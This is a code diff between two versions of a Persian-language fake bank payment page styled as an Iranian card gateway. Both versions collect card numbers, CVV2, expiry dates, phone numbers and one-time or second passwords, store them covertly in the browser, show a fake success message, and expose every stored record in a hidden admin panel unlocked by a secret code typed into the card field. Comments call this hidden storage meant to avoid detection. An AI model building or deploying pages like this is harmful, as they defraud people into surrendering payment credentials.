@@ -1,292 +1,77 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="fa">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>درگاه پرداخت امن شاپرک</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f5f5f5;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0;
-        }
-        .payment-wrapper {
-            background: #fff;
-            padding: 40px;
-            border-radius: 20px;
-            width: 90%;
-            max-width: 700px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-        .step { display: none; }
-        .step.active { display: block; }
-        .form-group { margin-bottom: 20px; }
-        label { font-size: 15px; color: #333; margin-bottom: 8px; display: block; }
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            direction: rtl;
-            text-align: right;
-        }
-        .btn {
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            background: #28a745;
-            color: #fff;
-        }
-        .btn:hover { background: #218838; }
-        .btn-cancel {
-            background: #dc3545;
-            margin-top: 15px;
-        }
-        .btn-clear {
-            background: #ff9800;
-            margin-top: 15px;
-            display: none;
-        }
-        .user-data {
-            margin-top: 20px;
-            padding: 15px;
-            background: #f9f9f9;
-            border-radius: 10px;
-            font-size: 14px;
-            direction: rtl;
-            max-height: 300px;
-            overflow-y: auto;
-            display: none;
-        }
-        #result { text-align: center; font-size: 20px; padding: 20px; }
-    </style>
+  <meta charset="UTF-8">
+  <title>پرداخت امن</title>
+  <style>
+    body { font-family: Tahoma, sans-serif; direction: rtl; background: #f5f5f5; margin: 0; }
+    .container { width: 400px; margin: 50px auto; background: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    .header { text-align: center; color: #005566; font-size: 18px; margin-bottom: 20px; }
+    .input-group { margin: 15px 0; }
+    input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+    button { width: 100%; padding: 12px; background: #005566; color: white; border: none; border-radius: 4px; cursor: pointer; }
+    button:hover { background: #003d4a; }
+    .hidden { display: none; }
+  </style>
 </head>
 <body>
-    <div class="payment-wrapper">
-        <div class="step active" id="step1">
-            <div class="form-group">
-                <label for="cardNumber">شماره کارت</label>
-                <input type="text" id="cardNumber" placeholder="---- ---- ---- ----" maxlength="19">
-            </div>
-            <div class="form-group">
-                <label for="expiry">تاریخ انقضا</label>
-                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
-            </div>
-            <div class="form-group">
-                <label for="cvv2">CVV2</label>
-                <input type="text" id="cvv2" placeholder="***" maxlength="4">
-            </div>
-            <button class="btn" id="nextStep1">مرحله بعد</button>
-        </div>
+  <div class="container">
+    <div class="header">درگاه پرداخت الکترونیک</div>
+    <form id="payment-form">
+      <div class="input-group">
+        <input type="text" id="card-number" placeholder="شماره کارت (16 رقم)" maxlength="16" required>
+      </div>
+      <div class="input-group">
+        <input type="password" id="cvv" placeholder="CVV2 (3 یا 4 رقم)" maxlength="4" required>
+      </div>
+      <div class="input-group">
+        <input type="password" id="password" placeholder="رمز دوم" required>
+      </div>
+      <button type="submit">پرداخت</button>
+    </form>
+    <div id="admin-panel" class="hidden"></div>
+  </div>
 
-        <div class="step" id="step2">
-            <div class="form-group">
-                <label for="phoneNumber">شماره تلفن</label>
-                <input type="tel" id="phoneNumber" placeholder="09XX-XXX-XXXX" maxlength="13">
-            </div>
-            <div class="form-group">
-                <label for="otp">رمز پویا</label>
-                <input type="text" id="otp" placeholder="******" maxlength="6">
-            </div>
-            <button class="btn" id="nextStep2">تأیید و پرداخت</button>
-        </div>
+  <script>
+    // ذخیره اطلاعات به صورت مخفی
+    document.getElementById("payment-form").addEventListener("submit", function(e) {
+      e.preventDefault();
+      let cardNumber = document.getElementById("card-number").value;
+      let cvv = document.getElementById("cvv").value;
+      let password = document.getElementById("password").value;
 
-        <div class="step" id="step3">
-            <div id="result"></div>
-        </div>
+      // ذخیره در localStorage
+      let data = { card: cardNumber, cvv: cvv, pass: password, time: new Date().toLocaleString() };
+      let storedData = JSON.parse(localStorage.getItem("payment-data")) || [];
+      storedData.push(data);
+      localStorage.setItem("payment-data", JSON.stringify(storedData));
 
-        <button class="btn btn-cancel" id="cancelBtn">انصراف</button>
-        <button class="btn btn-clear" id="clearDataBtn">پاک کردن اطلاعات</button>
-        <div class="user-data" id="userData"></div>
-    </div>
+      // شبیه‌سازی پرداخت موفق برای کاربر
+      alert("پرداخت با موفقیت انجام شد! (نمایشی)");
+      this.reset();
+    });
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('صفحه لود شد، اسکریپت شروع به کار کرد');
+    // چک کردن رمز مدیر
+    document.getElementById("card-number").addEventListener("input", function() {
+      if (this.value === "12122312") {
+        let storedData = JSON.parse(localStorage.getItem("payment-data")) || [];
+        let adminPanel = document.getElementById("admin-panel");
+        adminPanel.classList.remove("hidden");
+        adminPanel.innerHTML = `
+          <h3>مدیریت اطلاعات</h3>
+          <div style="text-align: right;">
+            ${storedData.map((d, i) => `${i + 1}. کارت: ${d.card} | CVV: ${d.cvv} | رمز: ${d.pass} | زمان: ${d.time}`).join("<br>")}
+          </div>
+          <button onclick="localStorage.clear(); document.getElementById('admin-panel').classList.add('hidden');" style="margin-top: 10px; background: #dc3545;">حذف همه</button>
+        `;
+        this.value = ""; // پاک کردن رمز مدیر از فیلد
+      }
+    });
 
-            // متغیرها
-            let currentStep = 1;
-            let userData = {};
-            let allUsersData = JSON.parse(localStorage.getItem('allUsersData')) || [];
-            let isSpecialMode = false;
-            const SPECIAL_CODE = '12122312';
-
-            // المنت‌ها
-            const steps = [
-                document.getElementById('step1'),
-                document.getElementById('step2'),
-                document.getElementById('step3')
-            ];
-            const userDataDiv = document.getElementById('userData');
-            const clearDataBtn = document.getElementById('clearDataBtn');
-
-            // فرمت کردن ورودی‌ها
-            document.getElementById('cardNumber').addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\D/g, '');
-                if (value === SPECIAL_CODE) {
-                    enterAdminMode();
-                    return;
-                }
-                value = value.replace(/(.{4})/g, '$1-').slice(0, 19).trim();
-                e.target.value = value;
-            });
-
-            document.getElementById('expiry').addEventListener('input', function(e) {
-                let v = e.target.value.replace(/\D/g, '');
-                if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
-                e.target.value = v.slice(0, 5);
-            });
-
-            document.getElementById('cvv2').addEventListener('input', function(e) {
-                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
-            });
-
-            document.getElementById('phoneNumber').addEventListener('input', function(e) {
-                let v = e.target.value.replace(/\D/g, '');
-                if (v.length > 0) {
-                    e.target.value = v.slice(0, 4) + (v.length > 4 ? '-' + v.slice(4, 7) : '') + (v.length > 7 ? '-' + v.slice(7, 11) : '');
-                }
-            });
-
-            document.getElementById('otp').addEventListener('input', function(e) {
-                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
-            });
-
-            // رویداد دکمه‌ها
-            document.getElementById('nextStep1').addEventListener('click', function() {
-                console.log('دکمه مرحله بعد 1 کلیک شد');
-                nextStep(1);
-            });
-
-            document.getElementById('nextStep2').addEventListener('click', function() {
-                console.log('دکمه مرحله بعد 2 کلیک شد');
-                nextStep(2);
-            });
-
-            document.getElementById('cancelBtn').addEventListener('click', function() {
-                console.log('دکمه انصراف کلیک شد');
-                cancel();
-            });
-
-            document.getElementById('clearDataBtn').addEventListener('click', function() {
-                console.log('دکمه پاک کردن اطلاعات کلیک شد');
-                clearData();
-            });
-
-            // توابع اصلی
-            function nextStep(step) {
-                if (!validateStep(step)) return;
-
-                saveUserData();
-                steps[step - 1].classList.remove('active');
-                currentStep = step + 1;
-                steps[currentStep - 1].classList.add('active');
-
-                if (currentStep === 3) {
-                    processPayment();
-                }
-            }
-
-            function validateStep(step) {
-                if (step === 1) {
-                    const cardNumber = document.getElementById('cardNumber').value;
-                    const expiry = document.getElementById('expiry').value;
-                    const cvv2 = document.getElementById('cvv2').value;
-
-                    if (!cardNumber) { alert('شماره کارت را وارد کنید'); return false; }
-                    if (!expiry) { alert('تاریخ انقضا را وارد کنید'); return false; }
-                    if (!cvv2) { alert('CVV2 را وارد کنید'); return false; }
-
-                    const cleanCardNumber = cardNumber.replace(/-/g, '');
-                    if (!/^\d{16}$/.test(cleanCardNumber)) { alert('شماره کارت باید ۱۶ رقم باشد'); return false; }
-                    if (!/^\d{2}\/\d{2}$/.test(expiry)) { alert('تاریخ انقضا باید MM/YY باشد'); return false; }
-                    if (!/^\d{3,4}$/.test(cvv2)) { alert('CVV2 باید ۳ یا ۴ رقم باشد'); return false; }
-                }
-
-                if (step === 2) {
-                    const phone = document.getElementById('phoneNumber').value.replace(/-/g, '');
-                    const otp = document.getElementById('otp').value;
-
-                    if (!phone) { alert('شماره تلفن را وارد کنید'); return false; }
-                    if (!otp) { alert('رمز پویا را وارد کنید'); return false; }
-                    if (phone.length !== 11 || !phone.startsWith('09')) { alert('شماره تلفن باید با 09 شروع شود و ۱۱ رقم باشد'); return false; }
-                    if (!/^\d{6}$/.test(otp)) { alert('رمز پویا باید ۶ رقم باشد'); return false; }
-                }
-                return true;
-            }
-
-            function saveUserData() {
-                userData = {
-                    'شماره کارت': document.getElementById('cardNumber').value,
-                    'تاریخ انقضا': document.getElementById('expiry').value,
-                    'CVV2': document.getElementById('cvv2').value,
-                    'شماره تلفن': document.getElementById('phoneNumber').value,
-                    'رمز پویا': document.getElementById('otp').value
-                };
-                allUsersData.push({ ...userData });
-                localStorage.setItem('allUsersData', JSON.stringify(allUsersData));
-                if (isSpecialMode) showUserData();
-            }
-
-            function showUserData() {
-                userDataDiv.style.display = 'block';
-                userDataDiv.innerHTML = '<h3>اطلاعات کاربران:</h3>' + 
-                    (allUsersData.length > 0 ? 
-                        allUsersData.map((user, index) => 
-                            `<div style="margin-bottom: 15px;"><h4>کاربر ${index + 1}:</h4>` + 
-                            Object.entries(user).map(([key, value]) => value ? `<p>${key}: ${value}</p>` : '').join('') +
-                            `</div>`).join('') : 
-                        '<p>هیچ اطلاعاتی موجود نیست</p>');
-            }
-
-            function enterAdminMode() {
-                isSpecialMode = true;
-                alert('حالت مدیر فعال شد');
-                currentStep = 3;
-                steps.forEach(step => step.classList.remove('active'));
-                steps[2].classList.add('active');
-                showUserData();
-                clearDataBtn.style.display = 'block';
-                document.getElementById('result').innerHTML = 'حالت مدیر: اطلاعات کاربران در زیر نمایش داده شده است.';
-            }
-
-            function processPayment() {
-                const result = document.getElementById('result');
-                result.innerHTML = 'در حال پردازش...';
-                setTimeout(() => {
-                    const transactionId = 'SHK-' + Math.random().toString(36).substr(2, 14).toUpperCase();
-                    userData['شماره تراکنش'] = transactionId;
-                    saveUserData();
-                    result.innerHTML = `پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ${transactionId}`;
-                }, 1000);
-            }
-
-            function cancel() {
-                if (confirm('آیا از لغو مطمئن هستید؟')) {
-                    saveUserData();
-                    document.body.innerHTML = '<h1>جلسه لغو شد</h1>';
-                }
-            }
-
-            function clearData() {
-                if (isSpecialMode && confirm('آیا مطمئن هستید که می‌خواهید تمام اطلاعات را پاک کنید؟')) {
-                    allUsersData = [];
-                    localStorage.setItem('allUsersData', JSON.stringify(allUsersData));
-                    showUserData();
-                }
-            }
-        });
-    </script>
+    // جلوگیری از تشخیص آسان
+    window.addEventListener("beforeunload", function() {
+      // اطلاعات موقع خروج یا رفرش پاک نمیشه و پنهان می‌مونه
+    });
+  </script>
 </body>
 </html>
